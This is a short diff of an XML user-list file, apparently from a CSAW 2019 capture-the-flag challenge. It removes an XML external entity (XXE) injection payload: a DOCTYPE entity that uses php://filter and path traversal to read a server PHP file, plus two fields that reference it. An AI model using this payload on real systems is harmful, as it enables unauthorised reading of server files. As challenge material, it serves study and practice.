@@ -1,5 +1,4 @@
 <?xml version='1.0'?>
-<!DOCTYPE root [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/../../../var/www/html/about.php'>]>
 <users>
     <user>
         <username>alice</username>
@@ -13,7 +12,6 @@
         <password>passwd2</password>
         <name> Bob</name>
         <email>bob@fakesite.com</email>  
-        <group>&test;</group>
-	<intro>&test;</intro>
+        <group>CSAW2019</group>
     </user>
 </users>
